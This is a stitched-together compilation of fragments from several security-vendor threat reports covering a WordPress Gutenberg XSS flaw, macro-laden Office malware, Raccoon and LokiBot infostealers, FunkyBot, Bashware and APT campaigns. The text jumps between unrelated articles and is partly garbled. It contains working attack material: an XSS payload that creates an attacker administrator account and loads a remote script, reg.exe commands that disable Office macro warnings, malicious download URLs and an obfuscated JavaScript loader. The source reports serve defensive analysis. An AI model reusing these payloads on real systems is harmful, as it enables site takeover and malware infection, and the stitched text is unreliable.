0	For instance, we havent seen any PDF exploits yet, which are very popular with other groups  an unusual thing.
0	The FortiGuard Labs team recently discovered a stored Cross-Site Scripting (XSS) zero-day vulnerability in WordPress.
0	This XSS vulnerability is caused by the new built-in editor Gutenberg found in WordPress 5.0.
0	The editor fails to filter the JavaScript/HTML code in the Shortcode error message.
0	The XSS filter in this preview can be easily bypassed with the PoC "&gt;&lt;img src=1 onerror=prompt(1)&gt;.
0	ajaxRequest.open("GET",requestURL,false);
0	varnonceMatch=nonceRegex.exec(ajaxRequest.responseText);
0	//ConstructaPOSTquery,usingthepreviouslyextracted'nonce'value,andcreateanewuserwithanarbitraryusername/password,asanAdministrator
0	varparams="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@site.com&pass1=attacker&pass2=attacker&role=administrator";
0	ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
0	"&gt;&lt;img src=1 onerror="javascript&colon;(function () { var url = 'http://aaa.bbb.ccc.ddd/ wpaddadmin.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; 
0	FortiGuard Labs contacted WordPress about this zero-day discovery, and they have issued a patch.
0	All users of vulnerable versions of WordPress are encouraged to upgrade to the latest WordPress version or apply the latest patches immediately.
0	Additionally, organizations that have deployed Fortinet IPS solutions are already protected from this vulnerability with the following signature:
0	WordPress.Shortcode.Preview.XSS
0	Learn more aboutFortiGuard Labsand the FortiGuard Security Servicesportfolio.Sign upfor our weekly FortiGuard Threat Brief.
0	Read about the FortiGuardSecurity Rating Service, which provides security audits and best practices.
0	This stored XSS vulnerability (identified as CVE-2019-16219) affects WordPress versions from 5.0 to 5.0.4, 5.1, and 5.1.1.
0	It is distributed on a massive scale by cybercrime organizations and it mainly uses macros within Microsoft Office Word or Excel document files that are included in spam mails.
0	The title and texts within the document include texts such as Freight Statement Of Outstanding As Of 03_29_2021 and Ocean Freight overdue invoice Of 03_29_2021, disguised as a statement, estimate, invoice, or overdue payment statement.
0	Such an operation method makes it difficult to find out the features by simply looking at the VBA or XLM macro sheet codes, and detecting based on specific area codes becomes difficult as well.
0	Private Declare PtrSafe Function line_shipping Lib "urlmon" 
0	line_shipping 0, sgs_assure(for_clients_d(Split(doc_an(0), "D" & ","))), last_cargo & "\" & rest_bags, 0, 0
0	hxxps://preescolarmamagansa.edu.mx/uo0j4ls.rar
0	[Behavior Detection]Malware/MDP.Behavior.M3664
0	[IOC]0801368e0e80ba88daad52d7e5977d223479d48fef3fa742d91e84705ff4f8826bd0ae7a5d92e2d47c1cb6cbdc7d47c6
0	Categories:Malware Information 
0	Tagged as:Excel Malware, Macro Malware, SPAMMAIL, VBA
0	One of the most notable LPE vulnerabilities we reported to MSRC was found on the Windows Network Connectivity Assistant (NCA), which is only enabled on the Enterprise or Education versions of Microsoft Windows 10.
0	The nature of this LPE vulnerability had previously been reported to MSRC as proof-of-concept (POC) by James Forshaw, an author and security researcher in Google's Project Zero.
0	if (!OpenThreadToken(GetCurrentThread(), TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_QUERY, true, &hToken))
0	Listing 1: Typical RPC server with a vulnerable process creation routine due to a client being impersonated by a server
0	In a nutshell, privilege escalation can happen when the RPC server attempts to impersonate the client and spawns a process at the same time without using an explicit token.
0	XMRig miner is one of the most widely used cryptominers for cryptojacking attacks, hence security tools treat it as a virus.
0	Therefore, in order to deceive them in this attack, it was fully obfuscated, which made the reverse engineering process harder.
0	In addition, we can conclude the malware is new because it uses XMRig 5.5.3, which was released on Feb. 2, 2020.
0	In addition, we were able to link Cetus to TeamTNT, a group that's been attacking AWS and Docker daemons that used the same Monero wallet address as Cetus.
0	We conclude that there is a growing trend of sophisticated attacks on the cloud.
0	Palo Alto Networks customers running Prisma Cloud are protected from this through the Prisma Cloud Compute host compliance protection, which alerts on an insufficient Docker daemon configuration and suggests a solution.
0	85X7JcgPpwQdZXaK2TKJb8baQAXc3zBsnW7JuY7MLi9VYSamf4bFwa7SEAK9Hgp2P53npV19w1zuaK5bft5m2NN71CmNLoh
0	Sign up to receive the latest news, cyber threat intelligence and research from us
0	Please enter your email address!
0	Please mark, I'm not a robot!
0	By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.
0	Reverse engineering Cetus was easy and fast since it doesnt use any anti-debugging or obfuscation techniques and even has symbols.
0	Figure 6: Users comments on an ExpensiveWall app
0	As seen in the image above, many users were suspicious and suspected that ExpensiveWall was a malicious app.
0	Check Point customers are protected by SandBlast Mobile, and on the network front by Check Point Anti-Bot blade, which provides protection against this threat with the signature: Trojan.AndroidOS.CopyCat
0	The main objective of the attackers was to gather intelligence from the compromised organizations, which included computer systems, personal mobile devices and network equipment.
0	The earliest evidence indicates that the cyber-espionage campaign was active since 2007 and is still active at the time of writing (January 2013).
0	Besides that, registration data used for the purchase of several Command & Control (C&C) servers and unique malware filenames related to the current attackers hints at even earlier time of activity dating back to May 2007.
0	Advanced Cyber-espionage Network: The attackers have been active for at least several years, focusing on diplomatic and governmental agencies of various countries across the world.
0	The system is resistant to C&C server takeover and allows the attack to recover access to infected machines using alternative communication channels.
0	Broad variety of targets: Beside traditional attack targets (workstations), the system is capable of stealing data from mobile devices, such as smartphones (iPhone, Nokia, Windows Mobile), enterprise network equipment (Cisco), removable disk drives (including already deleted files via a custom file recovery procedure).
0	Importation of exploits: The samples we managed to find were using exploit code for vulnerabilities in Microsoft Word and Microsoft Excel that were created by other attackers and employed during different cyber attacks.
0	We have observed the use of at least three different exploits for previously known vulnerabilities: CVE-2009-3129 (MS Excel), CVE-2010-3333 (MS Word) and CVE-2012-0158 (MS Word).
0	The first attacks that used the exploit for MS Excel started in 2010, while attacks targeting the MS Word vulnerabilities appeared in the summer of 2012.
0	As a notable fact, the attackers used exploit code that was made public and originally came from a previously known targeted attack campaign with Chinese origins.
0	Another noteworthy fact is in the first line of this file, which is a command to switch the codepage of an infected system to 1251.
0	This is required to address files and directories that contain Cyrillic characters in their names.
0	We have identified over 1000 different malicious files related to over 30 modules of this Trojan kit.
0	Most of them were created between May 2010 and October 2012.
0	There were 115 file-creation dates identified which are related to these campaigns via emails during the last two and a half years.
0	Concentration of file creation dates around a particular day may indicate date of the massive attacks (which was also confirmed by some of our side observations):
0	The attackers used already detected exploit codes and because of this, in the beginning of the research we already had some statistics of detections with our anti-malware software.
0	We searched for similar detections for the period of 2011-2012.
0	That is how we discovered more than 300 unique systems, which had detected at least one module of this Trojan kit.
0	Out of the list of domains, several were expired so we registered them to evaluate the number of victims connecting to them.
0	Bashware is a generic and cross platform technique that uses WSL in order to allow running both ELF an EXE malicious payloads in a stealthy manner that could bypass most current security solutions.
0	The key to the technique lies within the design of the Pico process structure.
0	The Pico process has none of the common windows process characteristics, and in fact  nothing that would identify it as a regular NT process at all.
0	Now that Bashware has set up a fully-fledged Linux environment on the Windows system, and is able to execute anything on both environments, the question is what could it do next?
0	As Bashware completes these 4 steps, it becomes a perfect demonstration tool for running any malware undetected, bypassing the most common security products  anti-viruses, inspection tools, debugging tools, and more.
0	Bashware does not leverage any logic or implementation flaws in WSLs design.
0	Alex Ionescus repository on GitHub:
0	https://github.com/ionescu007/lxss  Dedicated to research, code, and various studies of the Windows Subsystem for Linux used as great source of information and inspiration for this project.
0	Wine project  a free open-sourcecompatibility layerthat allowsMicrosoft Windowsprograms to run onUnix-likeoperating systems.
0	Its a complete compatibility layerfor runningan environment that looks and behaves just like Linux, allowing it to run any type of Linux code: Linux build system, GNU tools and anything else needed in order to build and test your application without having to fire up any virtual machines.
0	Pico processes are minimal and lack the structural blocks that are common to regular WindowsNT processes (PEB, TEB, NTDLL, etc.).
0	Pico processes are the containers that allow running ELF binaries on the Windows OS.
0	The concept of a Pico process was first introduced in a project called Drawbridge, and was originally used to run an application in an isolated environment (a form of virtualization for application sandboxing).
0	One way of establishing an isolated environment is by using a virtual machine, but this approach might cause resource overhead.
0	The drivers do not contain code from the Linux kernel but are instead a clean room implementation of Linux-compatible kernel interfaces.
0	Pico providers are essentially custom written kernel drivers which implement the necessary callbacks to respond to the list of possible events that Pico processes can trigger.
0	At the end of the day WSL is a very useful and innovative feature that provides developers with the familiar Bash shell and Linux environment in which they can run most Linux command-line tools, eliminating the need of creating a Linux virtual machine.
0	However, there is limited security awareness with regards to the WSL design, which allowed us to take advantage of this feature and run undetected malicious code inside a Linux instance.
0	(BASH.exe  image from https://msdn.microsoft.com/en-us/commandline/wsl/faq
0	Windows Subsystem for Linux out of Beta!
0	Despite being virtually empty if examined from within the Windows OS, Pico processes have the ability to interact with a WindowsNT Kernel.
0	The container has an isolated address space and is serviced by a component called Security Monitor.
0	With a growing number of cyber-attacks and the frequent news headlines on database breaches, spyware and ransomware, quality security products have become a commodity in every business organization.
0	The Bashware technique leverages the underlying mechanism of the Windows Subsystem for Linux (WSL).
0	This feature, introduced as part of Windows 10, allows native Linux ELF binaries to run on Windows.
0	Before diving into Bashwares internals, we will first review the inner workings of WSL.
0	https://blogs.msdn.microsoft.com/wsl/2016/04/22/windows-subsystem-for-linux-overview/
0	Although WSL has become a stable feature and many of its issues are now resolved, it seems the industry has still not adapted to the existence of this strange hybrid concept which allows a combination of Linux and Windows systems to run at the same time.
0	This may open a door for cyber criminals wishing to run their malicious code undetected, and allow them to use the features provided by WSL to hide from security products that have not yet integrated the proper detection mechanisms.
0	Watch the Demo of the Attack:https://youtu.be/fwEQFMbHIV8
0	The FortiGuard Labs SE team identified a new malicious spam campaign on August 21st,, which we discovered after an analysis of information initially found on VirusTotal.
0	It targeted a large US manufacturing company utilizing the well documented infostealer LokiBot.
0	Interestingly enough, this also has a compilation date of August 21st, which is the same day we discovered the malspam campaign.
0	[SHA256: 176C61B6220854995AF271F3BA82BBD7960AACC20E070A3476D8FBAC5AB0C2D8  detected as: Malicious_Behavior.SB] is not a request for quotation, and once unzipped, it is the infamous infostealer found on various underground forums, LokiBot.
0	[SHA256: 691c65e4fb1d19f82465df1d34ad51aaeceba14a78167262dc7b2840a6a6aa87 - detected as: W32/Windigo.ABV]
0	Shared Space  Previous attacks and possible spam relay?
0	Because of the differences in emails (both in language and attack template), and because we couldnt identify the payload being served in the June attack, we can only assume that this IP address is a newly identified spam relay that may either be used indiscriminately or in targeted attacks with LokiBot or some other unidentified malware.
0	LokiBot steals a variety of credentials  primarily FTP credentials, stored email passwords, passwords stored in the browser, as well as a whole host of other credentials.
0	LokiBot is distributed in various forms, and has been seen in the past being distributed in zipped files along with malicious macros in Microsoft Word and Excel, or leveraging the exploit CVE-2017-11882 (Office Equation Editor) via malicious RTF files, which is similar to the attack example above that targeted the German bakery (however, minus the use of a known exploit.)
0	The TLD for ML is Mali, and the domain is registered using the POINT ML (via partnership with Freenom) registrar, which offers free domains and free anonymous registrations.
0	To make matters worse, attribution is difficult because the domain (and IP address) are hosted using CloudFare, which anonymizes the originating IP address.
0	Which means we dont even know where the site is hosted, nor can we begin the attribution process to link it to previous campaigns.
0	MD5: 25e40e305dcf16f0da3b3656d9702fc7
0	SHA256: 176C61B6220854995AF271F3BA82BBD7960AACC20E070A3476D8FBAC5AB0C2D8
0	Date First Seen: 2019-08-21 13:12:11
0	FortiMail can also be configured to send attachments to our FortiSandbox solution (ATP), either on premises or in the cloud, to determine if a file displays malicious behavior.
0	FortiGate firewalls with Anti-Virus enabled alongside a valid subscription will detect and block this threat if configured to do so.
0	Execution: User Awareness Training  Since it has been reported that this threat has been delivered via social engineering distribution mechanisms, it is crucial that end users within an organization are made aware of various types of attacks delivered via social engineering.
0	This can be accomplished through regularly-occurring training sessions and impromptu tests using predetermined templates by internal security departments within an organization.
0	Simple user awareness training on how to spot emails with malicious attachments or links could stop the initial access into the network.
0	If user awareness training fails and the user opens the attachment or link, FortiClient running with the latest up-to-date virus signatures will detect and block this file and associated files.
0	The file(s) in this attack are currently being detected as:
0	Exfiltration & C&C: A FortiGate located at each of your ingress and egress points with its Web Filtering service enabled with up-to-date definitions, and or Botnet Security enabled will detect and block any observable outbound connections if configured correctly.
0	It is important to note that as attacks continue to become more sophisticated they can sometimes circumvent your security defenses for a number of reasons.
0	This is why it is important to ensure you also have the ability to detect anomalous activity that could be malicious.
0	Lastly, our Enterprise Bundle will address this attack as well as others.
0	Our Enterprise Bundle consolidates all the cyber security services you need to protect and defend against all cyberattack channels, from the endpoint to the cloud, including IoT devices, providing you with the integrated defense you need to tackle todays advanced threats and address today's challenging risk, compliance, management, visibility, and Operational Security (OT) concerns.
0	All network IOCs in this report are blacklisted by the FortiGuard Web Filtering service.
0	Learn more aboutFortiGuard Labsand the FortiGuard Security Servicesportfolio.Sign upfor our weekly FortiGuard Threat Brief.
0	Read about the FortiGuardSecurity Rating Service, which provides security audits and best practices.
0	It may have been developed by the same people behind the campaign as a substitute for the too-well known FakeSpy malware family they have been using up to now.Based on logging strings found in the persistence mechanism of the payload, as seen in figure 7, we have decided to call this new malware family FunkyBot.
0	We will be analysing the following sample:
0	152be211ecd21c8abfd7c687a5ca8a17906f589c59055516e5482ff3fcf42dbf
0	In this case, it is a JSON file called _dcfg_.data, and it loads the following parameters:
0	size: identifies the number of .dex payloads that the packer has to generate
0	payloadType: identifies where the encrypted data of the payload is located
0	isTestIn: flag used for testing purposes
0	type: identifies the kind of encryption used
0	In the samples we analysed, we found the following two configurations:
0	{"size":2,"payloadType":0,"isTestIn":"0","type":3}
0	{"size":2,"payloadType":1,"isTestIn":"0","type":3}
0	The packer determines which version of Android it is running on in order to generate the proper payload.
0	The code supports the following values:
0	0: No encryption
0	2/3 : variations of XOR based decryption with the value `0x51` (81)
0	Figure 5: Decrypt Switch
0	In the samples presented here, the configuration always had a value of 3, which corresponds to the following decryption function:
0	Figure 6: Decryption 'type' 3
0	One being a copy of the original legitimate application that the malware is impersonating, and the other being the malicious code.
0	The payload is started by calling the method `runCode` class `com.wfk.injectplugin.EntryPoint` through Java reflection.
0	This method starts `KeepAliceMain.start()`.
0	This strategy has been used by multiple campaigns, including FakeSpy and MoqHao, to enable the malware to spread in a worm-like fashion.
0	It is logical to assume that this sample would do the same.
0	After some research, we concluded that this behaviour might just be because the provider enables customers to send free SMS messages to each other, increasing the amount of traffic a single infected device is capable of generating before arousing suspicion.
0	By monitoring the campaign primarily targeting Japanese service providers, FortiGuard Labs was able to identify this campaign and what, to the best of our knowledge, is a new malware family.
0	During our analysis, we also encountered other samples that were not completely developed and lacked some of the functionalities discussed in this blogpost, suggesting that the malware is currently under development and is being tested in the wild.
0	The capabilities of this family are limited at the moment, but the fact that we were able to find different samples that showed significant improvement in the span of a few weeks shows that this family should not be underestimated.
0	FortiGuard Labs will continue to monitor this campaign as it evolves.
0	Fortinet customers are protected against this malware by the following Signatures:
0	Packer: Android/Agent.DDQ!tr
0	Payload: Android/Funky.A!tr and Android/Funky.B!tr
0	With malicious document files being distributedin various document formats such as HWP, DOC, XSLX, and PDF, it is safe to say that such a document-based malware has become a new trend among attackers.
0	In pursuit of this trend, ASEC analysis team has been publishing various articles that contain related information in our blog.
0	Today, ASEC analysis team will share the information on the newly-found malicious Word document file.
0	reg.exe add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\10.0\Word\Security\ /v VBAWarnings /t reg_dword /d 1 /freg.exe add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\11.0\Word\Security\ /v VBAWarnings /t reg_dword /d 1 /freg.exe add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\12.0\Word\Security\ /v VBAWarnings /t reg_dword /d 1 /freg.exe add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\13.0\Word\Security\ /v VBAWarnings /t reg_dword /d 1 /freg.exe add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Word\Security\ /v VBAWarnings /t reg_dword /d 1 /freg.exe add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Word\Security\ /v VBAWarnings /t reg_dword /d 1 /freg.exe add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Word\Security\ /v VBAWarnings /t reg_dword /d 1 /freg.exe add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\17.0\Word\Security\ /v VBAWarnings /t reg_dword /d 1 /freg.exe add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\18.0\Word\Security\ /v VBAWarnings /t reg_dword /d 1 /freg.exe add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\19.0\Word\Security\ /v VBAWarnings /t reg_dword /d 1 /fTable 1.
0	hxxp://ftcpark59.getenjoyment.net/1703/v.php?w=sakim&v=aelookupsvc appinfo eventsystem fdrespub fontcache gpsvc iphlpsvc lanmanserver lanmanworkstation lmhosts(omitted)smss.exe csrss.exe wininit.exe csrss.exe winlogon.exe services.exe(omitted) conhost.exe reg.exe conhost.exeTable 2.
0	This document file was created to prompt users to enter personal information and account number for retrieval of the compensation.
0	ASEC analysis team believe that the attacker intentionally designed the document this way to prompt user to enable malicious behaviors.
0	The reasoning behind this is the fact that VBA macro operates on certain keystrokes.
0	AhnLabs anti-malware solutions detect and block the files above using the following alias.
0	[File Detection]Downloader/DOC.Generic
0	[IOC Info]hxxp://ftcpark59.getenjoyment.net/1703/blank.php?v=sakimhxxp://ftcpark59.getenjoyment.net/1703/v.php?w=sakim&v=
0	Categories:Malware Information 
0	Tagged as:Compensation Request Disguise, Disguised Document, External Connection, Malicious Word File, VBA Macro
0	Security-forward identity and access management.The industrys top talent proactively researching attacks and trends to keep you ahead.
0	Insights to help you move fearlessly forward in a digital world.Join a passionate team that is humbled to be a trusted advisor to the world's top companies.
0	An infostealer is a type of malware that is focused on gathering sensitive and conditional information from the compromised system.
0	While this information is often related to the users credentials, they have also been known to search out financial and personal information.
0	While infostealers often target high value information, they generally arent sophisticated and are usually sold on hacking forums for anywhere from a few dollars to a couple of hundred dollars.
0	Most infostealers in the wild use the same techniques for stealing data, however, the difference in price could be due either to the length of the subscription and/or the robustness of their features  including targeted software, sophistication and other extra features.
0	Most of the infostealers are sold as Malware-As-A-Service (MaaS)  which allows malware authors to provide a fully working package to their customers (a.k.a cybercriminals) and also includes access to a technical support team and updates for the malware (bug fixes and new features).
0	Raccoon stealer  first seen in the wild in April 2019  is a popular infostealer nowadays because of its low price (USD$75 per week and $200 per month) and its rich features.
0	Also known as Racealer, Racoon is used to steal sensitive and confidential information including login credentials, credit card information, cryptocurrency wallets and browser information (cookies, history, autofill) from almost 60 applications.
0	Raccoon stealer is written in C++ and, while it lacks sophistication, it has a wide range of methods and features for stealing data from popular browsers, email clients and cryptocurrency wallets.
0	Raccoon is mostly delivered using one of two methods:
0	Most malware and particularly MaaS have a C&C server so that it can get information regarding the malware options/features enabled by the attacker and send back all the stolen data from the user.
0	The malware C&C server is required for malware functionality, therefore, in order to stay stealthy, the malware authors store the C&C servers address in some way to remain undetectable.
0	The stealer binary 3 contains hardcoded values:
0	Raccoon targets 29 chromium-based browsers including Google Chrome, Opera, etc.(full list below) that have the same folder structure and share a similar codebase, which leads to a similar way of handling sensitive data.
0	The sensitive data in those browsers is saved in the same format and the User Data application folder contains the SQLite databases.
0	Because these applications have the same method and folder structure, the stealing techniques for the applications are the same.
0	It is important to mention that Raccoon also supports an older version of Mozilla based applications  it supports Firefox versions <32, for example.
0	Raccoon also has the functionality to be used as a dropper, a feature that specializes in loading a second-stage malware payload onto a victims system.
0	Similar to other as-a-service offerings, Raccoon is still being developed and supported by a group.
0	This kind of information stealer can cause a lot of damage to individuals and organizations.
0	The attackers are looking for privileged credentials in order to achieve privilege escalation and lateral movement.
0	What used to be reserved for more sophisticated attackers is now possible even for novice players who can buy stealers like Raccoon and use them to get their hands on an organizations sensitive data.
0	And this goes beyond usernames and passwords to information that can get them immediate financial gain like credit card information and cryptocurrency wallets.
0	Even though Raccoon is not the most sophisticated tool available, it is still very popular among cybercriminals and will likely continue to be.
0	To defend against credential stealing malware, organizations can use a solution like CyberArk Endpoint Privilege Manager, combined with basic common sense tactics like updating systems and applications, avoiding opening suspicious attachments or clicking on unknown URLs.
0	Proactively protecting vulnerable endpoints is critical to improving an organizations overall security posture.
0	If youre interested in a comprehensive technical analysis of this malwares techniques and capabilities, download our free whitepaper, Analyzing the Raccoon Stealer.AppendixGoogle Chrome, Google Chrome (Chrome SxS), Chromium, Xpom, Comodo Dragon, Amigo, Orbitum, Bromium, Nichrome, RockMelt, 360Browser, Vivaldi, Opera, Sputnik, Kometa, Uran, QIP Surf, Epic Privacy, CocCoc, CentBrowser, 7Star, Elements, TorBro, Suhba, Safer Browser, Mustang, Superbird, Chedot, Torch
0	Internet Explorer, Microsoft Edge
0	Firefox, WaterFox, SeaMonkey, PaleMoonThunderBird, Outlook, FoxmailElectrum, Ethereum, Exodus, Jaxx, Monero, BitherThese days, when the world is focused on getting a handle on the COVID-19 crisis, cybercriminals are taking...1 Introduction 2 Common Architectures ofThick Client applications 2.1 Two-Ttier architecture 2.2 Three-Tie...Introduction Who are you?
0	Thats a hard question to answer.
0	Many philosophers have been fascinated with this question for years.
0	Who are you in cyberspace?
0	Your digital identity is comprised of...Introduction In this blog series, we will cover the topic of rootkits  how they are built and the basics of kernel driver analysis  specifically on the Windows platform.
0	In this first part, we...Our love for gaming alongside finding bugs led us back to the good ol question: 
0	Is it true that the more RGB colors you have (except for your gaming chair, of course), the more skill...Several years ago, when I spoke with people about containers, most of them were not familiar with the term.
0	The infamous Sednit espionage group is currently using the Hacking Team exploits disclosed earlier this week to target eastern European institutions.
0	The infamous Sednit espionage group is currently using the Hacking Team exploits disclosed earlier this week to target eastern European institutions.
0	More than 400GB of internal data from the company Hacking Team were released on the Internet last weekend.
0	To do so, they develop their own software, including such tools as specialized spying software and exploit kits.
0	On Wednesday the 8th of July 2015 the Sednit group started to use the Hacking Team Flash exploit in their exploit kit.
0	The following Figures show the Main function in the two cases.
0	Figure 1  Hacking Team Flash exploit main function
0	Figure 2  Sednit Flash exploit main function
0	This story shows that advanced groups of attackers also employ opportunistic strategies.
0	It took only a few days for the Sednit group to re-use the Hacking Team exploitation chain for their own purpose.
0	The Webky group  another APT team  was also reported to have done the same this week.
0	We strongly encourage users to upgrade their Flash software.
0	This week ESET spotted a malicious team that rushed to integrate Hacking Team exploits into its arsenal: the Sednit group.
0	B8B3F53CA2CD64BD101CB59C6553F6289A72D9BB
0	10 Jul 2015 - 01:52PM
0	Sign up to receive an email update whenever a new article is published in our Ukraine Crisis  Digital Security Resource Center
0	Several days ago, a number of leaked documents from the Syrian Ministry of Foreign Affairs were published on Par:AnoIA, a new wikileaks-style site managed by the Anonymous collective.
0	This PDF file contains an exploit (CVE-2010-0188) for Adobe Reader 8.x before 8.2.1 and 9.x before 9.3.1.
0	We checked it in Adobe Reader 9.2.0 and Adobe 9.3.0 and the exploit successfully worked.
0	If the process goes smoothly, the user is presented with what looks like a legitimate PDF document, which after all, is exactly what everybody expects to see after double-clicking on a PDF file icon:
0	Screenshot showing the fake PDF file that is displayed when the exploit successfully runs.
0	This was discovered after analysis of an email we received from a Kaspersky user.
0	This email originally appeared as part of a data dump on Par:AnoIA website.
0	It is rather specific, and it lets us to map its usage during late 2011 and 2012.
0	Heres a map of detections during the past year:
0	And a distribution by country:
0	As you can see, the number of incidents is rather low, indicating the highly targeted nature of the attack.
0	Our analysis has uncovered other similar PDF files (with the same exploit) that have been used against pro-Tibet supporters throughout 2012.
0	Interestingly the following fallback proxy preferences are hardcoded in the malware:
0	This is probably represent developers local settings and was put for his own convenience during malware testing stage, unless the attackers had already known something about the infrastructure of the victim.
0	Note there is a typo in Proxy-Connetion header substring made by the authors, so it will probably not keep long-term connections when working via proxy server.
0	It expects at least 1 byte out of the following values that correspond to commands:
0	Current Windows version (Minor/Major Version Number, Service Pack, Platform ID)
0	User privilege level (Guest/User/Admin) from local Domain Controller
0	We let the infected machine connect to that host from an IP address in India, however no one has issued any commands so far.
0	The malware remained in waiting mode for several hours.
0	Targeted attacks like the one described here are quite common for governments and governmental institutions.
0	Although the victims rarely agree to share samples, its interesting to point out that leaks can sometimes reveal such attacks as well, directly or indirectly.
0	Most of the malware used in the attacks are relatively simplistic and have basic functions to connect back to the C&C to download additional components.
0	Once the attackers have established a foothold in the organization, they proceed with privilege escalation tools for lateral movement within the network and specialized utilities for data stealing and exfiltration.
0	We are continuing to analyse these extremely targeted attacks and will post more updates in the future.
0	In the previous, ASEC analysis team has introduced various types of document-based malware.
0	Among them, malicious documents of North Korea related materials were generally produced in HWP file format.
0	You can check the relevant information from previous ASEC blog posts.
0	Within XML, the document can connect to the external URL defined as External as shown in examples below.Most of the recently distributed documents related to North Korea use such an attack technique, therefore users must be aware of these attacks to prevent damage.
0	Example of External Attack (Part of XML code)Target=hxxp://www.anpcb.co.kr/plugin/sns/facebook/src/update/normal.dotm?q=6 TargetMode=External/>
0	As [Document 1, 2, 3] were protected, ASEC analysis team couldnt open the files right away, the team had to first unlock them to open the documents.
0	[Document 1, 2] with VBA Macro Word files which seem to follow the operation flow shown below will be explained.
0	[Figure 1]  Operation flow
0	[Document 1] contains a questionnaire related to North Korea with its file protected.
0	Additional access address for XML created from document above:hxxp://koreacit.co.kr/skin/new/basic/update/list.php?query=1
0	As mentioned above, these documents are sent via email and are highly likely to be sent to people engaged in North Korea-related fields.
0	Since social engineering technique attacks via emails have substantially increased, users must remain vigilant to prevent damage by the attacks.
0	AhnLab detects and blocks the files above using the following aliases:
0	[File Detection]Downloader/DOC.ExternalDownloader/XML.GenericDownloader/DOC.GenericDownloader/DOC.Agent
0	[IOC Info]hxxp://www.inonix.co.kr/kor/board/widgets/mcontent/skins/tmp?
0	Over the past few months, we have detected sophisticated script-based malware through Internet Explorer (IE) browser exploits that infect Windows Operating System (OS) users.
0	We decided to investigate those scripts to identify their key features to demonstrate that they are attractive for attackers and so could lead to a trend worth paying attention to.
0	Indeed, with scripting languages, attackers have flexible and accessible tools to easily create sophisticated malware with multiple features and obfuscations.
0	Finally, to give more details about scripting languages used for script-based malware, we explore possible explanations for the attackers choice to use scripts instead of regular executables as the payload in the browser exploit.
0	Organizations with up-to-date Windows hosts that follow security best practices for secure web browsing have a much lower risk of infection.
0	Palo Alto Networks customers are protected from this threat via IPS signatures.
0	URL Filtering and WildFire both identify related samples and infrastructure as malware.
0	var _0xd766=["\x31\x6D \x3D \x3B\x31\x6D \x3D \x3A\x2F\x2F \x2E \x2E\x31\x4A\x2F \x2F \x2F\x31\x4F\x22\x3B\x31\x6D \x3D \x2E\x31\x4B\x22\x3B\x31\x6D \x3D \x3B\x31\x6D \x3D \x7B \x3B\x7D \x7B \x6A \x2C\x61\x2C\x63\x2C\x6B\x2C\x65\x2C \x7B\x65\x3D\x31\x6A \x7B\x31\x6B \x3C\x61\x3F\x5C\x27\x5C\x27\x3A \x2F \x2B \x3D \x3E \x3F \x2E \x2B \x3A\x63\x2E \x7D\x3B \x5C\x27\x5C\x27\x2E \x2F\x5E\x2F\x2C \x7B\x31\x7A \x2D\x2D\x29\x7B\x64\x5B \x5D\x3D\x6B\x5B\x63\x5D\x7C\x7C \x7D\x6B\x3D\x5B\x31\x6A \x7B\x31\x6B \x5B\x65\x5D\x7D\x5D\x3B\x65\x3D\x31\x6A \x7B\x31\x6B\x5C\x27\x5C\x5C\x5C\x5C\x77\x2B\x5C\x27\x7D\x3B\x63\x3D\x31\x7D\x3B\x31\x7A \x2D\x2D\x29\x7B \x6B\x5B\x63\x5D\x29\x7B\x70\x3D\x70\x2E \x5C\x27\x5C\x5C\x5C\x5C\x62\x5C\x27\x2B \x2B\x5C\x27\x5C\x5C\x5C\x5C\x62\x5C\x27\x2C\x5C \x5C \x2C\x6B\x5B\x63\x5D\x29\x7D\x7D\x31\x6B \x7D\x28\x5C \x3D \x2C \x7B \x3D\x5C\x5C\x5C\x27\x5C\x5C\x5C\x27\x3B\x6B \x3D\x30\x3B\x69\x3C\x61\x2E\x7A\x3B\x69\x2B\x2B\x29\x7B\x39\x3D\x39\x2B\x47\x2E\x6E \x2E\x4A \x2E \x5E \x7D \x7D\x3B \x3D \x7B \x3D \x3B \x3D\x61\x2E \x2F\x2E\x7B\x31\x2C\x32\x7D\x2F \x7C\x7C\x5B\x5D\x3B\x6B \x3D\x30\x3B\x69\x3C\x64\x2E\x7A\x3B\x69\x2B\x2B\x29\x7B\x39\x2B\x3D\x47\x2E\x6E \x5B\x69\x5D\x2C \x7D\x3B \x7D\x3B \x3D \x6C\x2C \x7B \x2E \x2E \x2A \x2D\x6C\x2B \x2B\x6C\x7D\x3B \x3D \x2C\x4F\x29\x3B \x3D\x22\x6F\x3A\x2F\x2F\x6D\x2E\x77\x2E\x76\x2F\x6A\x2F\x46\x2F\x48\x2F\x6A\x2E\x49\x3F\x72\x3D\x22\x2B\x62\x2E\x4B \x3B \x3D \x3B\x6B\x28\x3B\x3B\x29\x7B\x4C\x7B\x38\x3D \x4E \x4D\x2E\x55\x2E\x35\x2E \x3B\x38\x2E \x2C\x66\x2C \x3B\x70\x3D \x2F\x34\x2E \x3B \x2E\x30\x3B \x2E \x3B\x75\x3D \x2D \x3B\x38\x2E \x2C \x3B\x38\x2E\x5A \x3B\x38\x2E \x3B \x2E\x58\x3D\x3D \x7B \x3D \x3D\x5C\x5C\x5C\x5C\x22\x6F\x3A\x2F\x2F\x6D\x2E\x77\x2E\x76\x2F\x6A\x2F\x46\x2F\x48\x2F \x2E\x49\x5C\x5C\x5C\x5C\x22\x3B \x3D\x5C\x5C\x5C\x5C \x5C\x5C\x5C\x5C\x22\x3B\x22\x2B \x2C \x2E \x3B \x7D\x7D \x7B\x7D\x3B \x2E \x7D\x3B\x5C\x27\x2C\x32\x6F\x2C \x2C\x5C\x27\x7C\x7C\x7C\x31\x6D\x7C\x7C\x7C\x7C\x7C 